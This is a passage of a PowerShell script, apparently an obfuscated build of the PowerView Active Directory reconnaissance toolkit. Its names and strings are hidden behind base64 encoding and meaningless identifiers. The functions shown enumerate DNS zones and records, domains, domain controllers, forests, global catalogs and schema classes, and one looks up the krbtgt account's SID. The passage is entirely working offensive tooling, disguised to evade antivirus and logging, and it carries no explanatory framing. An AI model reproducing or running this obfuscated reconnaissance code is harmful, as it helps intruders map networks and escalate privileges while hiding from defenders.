        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${__/\/\/\_/=\_/\_/} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
        if (${__/\/\/\_/=\_/\_/}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${/==\_/=\____/===\} = ${__/\/\/\_/=\_/\_/}.FindOne()  }
            else { ${/==\_/=\____/===\} = ${__/\/\/\_/=\_/\_/}.FindAll() }
            ${/==\_/=\____/===\} | ? {$_} | % {
                ${__/\/=\/\/\/==\__} = ____/=\__/\/=\__/= -Properties $_.Properties
                ${__/\/=\/\/\/==\__} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WgBvAG4AZQBOAGEAbQBlAA=='))) ${__/\/=\/\/\/==\__}.name
                ${__/\/=\/\/\/==\__}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAE4AUwBaAG8AbgBlAA=='))))
                ${__/\/=\/\/\/==\__}
            }
            if (${/==\_/=\____/===\}) {
                try { ${/==\_/=\____/===\}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARQByAHIAbwByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAagBlAGMAdAA6ACAAJABfAA==')))
                }
            }
            ${__/\/\/\_/=\_/\_/}.dispose()
        }
        ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQBQAHIAZQBmAGkAeAA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0ATQBpAGMAcgBvAHMAbwBmAHQARABOAFMALABEAEMAPQBEAG8AbQBhAGkAbgBEAG4AcwBaAG8AbgBlAHMA')))
        ${__/\_/==\/=====\_} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
        if (${__/\_/==\/=====\_}) {
            try {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${/==\_/=\____/===\} = ${__/\_/==\/=====\_}.FindOne() }
                else { ${/==\_/=\____/===\} = ${__/\_/==\/=====\_}.FindAll() }
                ${/==\_/=\____/===\} | ? {$_} | % {
                    ${__/\/=\/\/\/==\__} = ____/=\__/\/=\__/= -Properties $_.Properties
                    ${__/\/=\/\/\/==\__} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WgBvAG4AZQBOAGEAbQBlAA=='))) ${__/\/=\/\/\/==\__}.name
                    ${__/\/=\/\/\/==\__}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAE4AUwBaAG8AbgBlAA=='))))
                    ${__/\/=\/\/\/==\__}
                }
                if (${/==\_/=\____/===\}) {
                    try { ${/==\_/=\____/===\}.dispose() }
                    catch {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQATgBTAFoAbwBuAGUAXQAgAEUAcgByAG8AcgAgAGQAaQBzAHAAbwBzAGkAbgBnACAAbwBmACAAdABoAGUAIABSAGUAcwB1AGwAdABzACAAbwBiAGoAZQBjAHQAOgAgACQAXwA=')))
                    }
                }
            }
            catch {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQATgBTAFoAbwBuAGUAXQAgAEUAcgByAG8AcgAgAGEAYwBjAGUAcwBzAGkAbgBnACAAJwBDAE4APQBNAGkAYwByAG8AcwBvAGYAdABEAE4AUwAsAEQAQwA9AEQAbwBtAGEAaQBuAEQAbgBzAFoAbwBuAGUAcwAnAA==')))
            }
            ${__/\_/==\/=====\_}.dispose()
        }
    }
}
function Get-DomainDNSRecord {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSRecord')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0,  Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ZoneName,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties = 'name,distinguishedname,dnsrecord,whencreated,whenchanged',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ${/=\___/=\__/=\/\/} = @{
            'LDAPFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQBkAG4AcwBOAG8AZABlACkA')))
            'SearchBasePrefix' = "DC=$($ZoneName),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${_______/\__/=\/=\} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
        if (${_______/\__/=\/=\}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${/==\_/=\____/===\} = ${_______/\__/=\/=\}.FindOne() }
            else { ${/==\_/=\____/===\} = ${_______/\__/=\/=\}.FindAll() }
            ${/==\_/=\____/===\} | ? {$_} | % {
                try {
                    ${__/\/=\/\/\/==\__} = ____/=\__/\/=\__/= -Properties $_.Properties | select name,distinguishedname,dnsrecord,whencreated,whenchanged
                    ${__/\/=\/\/\/==\__} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WgBvAG4AZQBOAGEAbQBlAA=='))) $ZoneName
                    if (${__/\/=\/\/\/==\__}.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        ${__/=\__/\_/\/\__/} = ___/====\/\_/==\/= -DNSRecord ${__/\/=\/\/\/==\__}.dnsrecord[0]
                    }
                    else {
                        ${__/=\__/\_/\/\__/} = ___/====\/\_/==\/= -DNSRecord ${__/\/=\/\/\/==\__}.dnsrecord
                    }
                    if (${__/=\__/\_/\/\__/}) {
                        ${__/=\__/\_/\/\__/}.PSObject.Properties | % {
                            ${__/\/=\/\/\/==\__} | Add-Member NoteProperty $_.Name $_.Value
                        }
                    }
                    ${__/\/=\/\/\/==\__}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAE4AUwBSAGUAYwBvAHIAZAA='))))
                    ${__/\/=\/\/\/==\__}
                }
                catch {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQATgBTAFIAZQBjAG8AcgBkAF0AIABFAHIAcgBvAHIAOgAgACQAXwA=')))
                    ${__/\/=\/\/\/==\__}
                }
            }
            if (${/==\_/=\____/===\}) {
                try { ${/==\_/=\____/===\}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQATgBTAFIAZQBjAG8AcgBkAF0AIABFAHIAcgBvAHIAIABkAGkAcwBwAG8AcwBpAG4AZwAgAG8AZgAgAHQAaABlACAAUgBlAHMAdQBsAHQAcwAgAG8AYgBqAGUAYwB0ADoAIAAkAF8A')))
                }
            }
            ${_______/\__/=\/=\}.dispose()
        }
    }
}
function ____/\/\/=\/\/==\/ {
    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAF0AIABVAHMAaQBuAGcAIABhAGwAdABlAHIAbgBhAHQAZQAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAGYAbwByACAARwBlAHQALQBEAG8AbQBhAGkAbgA=')))
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
                $TargetDomain = $Domain
            }
            else {
                $TargetDomain = $Credential.GetNetworkCredential().Domain
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAF0AIABFAHgAdAByAGEAYwB0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAFQAYQByAGcAZQB0AEQAbwBtAGEAaQBuACcAIABmAHIAbwBtACAALQBDAHIAZQBkAGUAbgB0AGkAYQBsAA==')))
            }
            ${_/====\__/\/=\/\/} = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))), $TargetDomain, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(${_/====\__/\/=\/\/})
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAF0AIABUAGgAZQAgAHMAcABlAGMAaQBmAGkAZQBkACAAZABvAG0AYQBpAG4AIAAnACQAVABhAHIAZwBlAHQARABvAG0AYQBpAG4AJwAgAGQAbwBlAHMAIABuAG8AdAAgAGUAeABpAHMAdAAsACAAYwBvAHUAbABkACAAbgBvAHQAIABiAGUAIABjAG8AbgB0AGEAYwB0AGUAZAAsACAAdABoAGUAcgBlACAAaQBzAG4AJwB0ACAAYQBuACAAZQB4AGkAcwB0AGkAbgBnACAAdAByAHUAcwB0ACwAIABvAHIAIAB0AGgAZQAgAHMAcABlAGMAaQBmAGkAZQBkACAAYwByAGUAZABlAG4AdABpAGEAbABzACAAYQByAGUAIABpAG4AdgBhAGwAaQBkADoAIAAkAF8A')))
            }
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ${_/====\__/\/=\/\/} = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))), $Domain)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(${_/====\__/\/=\/\/})
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAF0AIABUAGgAZQAgAHMAcABlAGMAaQBmAGkAZQBkACAAZABvAG0AYQBpAG4AIAAnACQARABvAG0AYQBpAG4AJwAgAGQAbwBlAHMAIABuAG8AdAAgAGUAeABpAHMAdAAsACAAYwBvAHUAbABkACAAbgBvAHQAIABiAGUAIABjAG8AbgB0AGEAYwB0AGUAZAAsACAAbwByACAAdABoAGUAcgBlACAAaQBzAG4AJwB0ACAAYQBuACAAZQB4AGkAcwB0AGkAbgBnACAAdAByAHUAcwB0ACAAOgAgACQAXwA=')))
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAF0AIABFAHIAcgBvAHIAIAByAGUAdAByAGkAZQB2AGkAbgBnACAAdABoAGUAIABjAHUAcgByAGUAbgB0ACAAZABvAG0AYQBpAG4AOgAgACQAXwA=')))
            }
        }
    }
}
function _/=\/\/=\/\__/\/\/ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Computer')]
    [OutputType('System.DirectoryServices.ActiveDirectory.DomainController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Switch]
        ${__/=\/\/\/\___/\__},
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ${/=\/\/==\/\___/\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\/\/==\/\___/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\/\/==\/\___/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA=')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\/\/==\/\___/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            ${/=\/\/==\/\___/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADgAMQA5ADIAKQA=')))
            _/==\/\/\_______/\ @/=\/\/==\/\___/\/
        }
        else {
            ${/====\___/\/\/===} = ____/\/\/=\/\/==\/ @/=\/\/==\/\___/\/
            if (${/====\___/\/\/===}) {
                ${/====\___/\/\/===}.DomainControllers
            }
        }
    }
}
function _/=\/\/\____/==\/= {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEYAbwByAGUAcwB0AF0AIABVAHMAaQBuAGcAIABhAGwAdABlAHIAbgBhAHQAZQAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAGYAbwByACAARwBlAHQALQBGAG8AcgBlAHMAdAA=')))
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) {
                ${/====\/\/\_____/\} = $Forest
            }
            else {
                ${/====\/\/\_____/\} = $Credential.GetNetworkCredential().Domain
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEYAbwByAGUAcwB0AF0AIABFAHgAdAByAGEAYwB0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAEYAbwByAGUAcwB0ACcAIABmAHIAbwBtACAALQBDAHIAZQBkAGUAbgB0AGkAYQBsAA==')))
            }
            ${_/\/=\/\/=\_/\_/\} = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA'))), ${/====\/\/\_____/\}, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            try {
                ${_/====\_/\_/=\/==} = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest(${_/\/=\/\/=\_/\_/\})
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEYAbwByAGUAcwB0AF0AIABUAGgAZQAgAHMAcABlAGMAaQBmAGkAZQBkACAAZgBvAHIAZQBzAHQAIAAnACQAewAvAD0APQA9AD0AXAAvAFwALwBcAF8AXwBfAF8AXwAvAFwAfQAnACAAZABvAGUAcwAgAG4AbwB0ACAAZQB4AGkAcwB0ACwAIABjAG8AdQBsAGQAIABuAG8AdAAgAGIAZQAgAGMAbwBuAHQAYQBjAHQAZQBkACwAIAB0AGgAZQByAGUAIABpAHMAbgAnAHQAIABhAG4AIABlAHgAaQBzAHQAaQBuAGcAIAB0AHIAdQBzAHQALAAgAG8AcgAgAHQAaABlACAAcwBwAGUAYwBpAGYAaQBlAGQAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIABhAHIAZQAgAGkAbgB2AGEAbABpAGQAOgAgACQAXwA=')))
                $Null
            }
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) {
            ${_/\/=\/\/=\_/\_/\} = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA'))), $Forest)
            try {
                ${_/====\_/\_/=\/==} = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest(${_/\/=\/\/=\_/\_/\})
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEYAbwByAGUAcwB0AF0AIABUAGgAZQAgAHMAcABlAGMAaQBmAGkAZQBkACAAZgBvAHIAZQBzAHQAIAAnACQARgBvAHIAZQBzAHQAJwAgAGQAbwBlAHMAIABuAG8AdAAgAGUAeABpAHMAdAAsACAAYwBvAHUAbABkACAAbgBvAHQAIABiAGUAIABjAG8AbgB0AGEAYwB0AGUAZAAsACAAbwByACAAdABoAGUAcgBlACAAaQBzAG4AJwB0ACAAYQBuACAAZQB4AGkAcwB0AGkAbgBnACAAdAByAHUAcwB0ADoAIAAkAF8A')))
                return $Null
            }
        }
        else {
            ${_/====\_/\_/=\/==} = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }
        if (${_/====\_/\_/=\/==}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                ${_/==\/==\/===\/\/} = (__/\__/\/======\_/ -Identity $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awByAGIAdABnAHQA'))) -Domain ${_/====\_/\_/=\/==}.RootDomain.Name -Credential $Credential).objectsid
            }
            else {
                ${_/==\/==\/===\/\/} = (__/\__/\/======\_/ -Identity $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awByAGIAdABnAHQA'))) -Domain ${_/====\_/\_/=\/==}.RootDomain.Name).objectsid
            }
            ${__/=\__/\____/=\_} = ${_/==\/==\/===\/\/} -Split '-'
            ${_/==\/==\/===\/\/} = ${__/=\__/\____/=\_}[0..$(${__/=\__/\____/=\_}.length-2)] -join '-'
            ${_/====\_/\_/=\/==} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAG8AdABEAG8AbQBhAGkAbgBTAGkAZAA='))) ${_/==\/==\/===\/\/}
            ${_/====\_/\_/=\/==}
        }
    }
}
function Get-ForestDomain {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ${/=\/\/==\/\___/\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) { ${/=\/\/==\/\___/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))] = $Forest }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\/\/==\/\___/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${_/====\_/\_/=\/==} = _/=\/\/\____/==\/= @/=\/\/==\/\___/\/
        if (${_/====\_/\_/=\/==}) {
            ${_/====\_/\_/=\/==}.Domains
        }
    }
}
function Get-ForestGlobalCatalog {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.GlobalCatalog')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ${/=\/\/==\/\___/\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) { ${/=\/\/==\/\___/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))] = $Forest }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\/\/==\/\___/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${_/====\_/\_/=\/==} = _/=\/\/\____/==\/= @/=\/\/==\/\___/\/
        if (${_/====\_/\_/=\/==}) {
            ${_/====\_/\_/=\/==}.FindAllGlobalCatalogs()
        }
    }
}
function Get-ForestSchemaClass {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [Alias('Class')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ClassName,
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ${/=\/\/==\/\___/\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) { ${/=\/\/==\/\___/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))] = $Forest }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\/\/==\/\___/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${_/====\_/\_/=\/==} = _/=\/\/\____/==\/= @/=\/\/==\/\___/\/
        if (${_/====\_/\_/=\/==}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGEAcwBzAE4AYQBtAGUA')))]) {
                ForEach (${___/\__/=\/=\__/\} in $ClassName) {
                    ${_/====\_/\_/=\/==}.Schema.FindClass(${___/\__/=\/=\__/\})
                }
            }
            else {
                ${_/====\_/\_/=\/==}.Schema.FindAllClasses()
            }
        }
    }
}
function Find-DomainObjectPropertyOutlier {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.PropertyOutlier')]
    [CmdletBinding(DefaultParameterSetName = 'ClassName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ClassName')]
        [Alias('Class')]
        [ValidateSet('User', 'Group', 'Computer')]
        [String]
        $ClassName,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ReferencePropertySet,
